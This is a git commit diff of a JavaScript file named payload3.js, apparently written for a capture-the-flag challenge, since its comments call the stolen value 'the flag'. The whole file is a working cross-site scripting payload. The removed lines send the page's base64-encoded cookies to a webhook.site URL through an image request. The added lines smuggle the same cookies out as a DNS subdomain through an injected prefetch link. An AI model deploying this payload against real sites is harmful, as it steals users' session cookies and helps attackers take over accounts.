eceb93f2664ba2f048da1d1a26e9ee55f5077088
s25553258troy <s25553258troy@gmail.com>
2026-03-06 21:54:40 +0800

    Update payload3.js

--- payload3.js
+++ payload3.js
@@ -1,4 +1,18 @@
 setTimeout(() => {
-    let img = new Image();
-    img.src = 'https://webhook.site/c28bdc7e-0993-4d8f-9a72-728714667c7f/?c=' + btoa(document.cookie);
+    // Get the flag from the cookie
+    let flag = document.cookie;
+    
+    // Encode it to Base64, remove padding (=), and make it lowercase
+    // This makes it a valid, safe DNS subdomain
+    let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();
+
+    // Inject a DNS prefetch link
+    let link = document.createElement('link');
+    link.rel = 'prefetch';
+    
+    // Set the href to a subdomain of your unique webhook ID
+    link.href = 'http://' + safeFlag + '.c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site/';
+    
+    // Append it to the document to trigger the DNS lookup
+    document.head.appendChild(link);
 }, 3000);
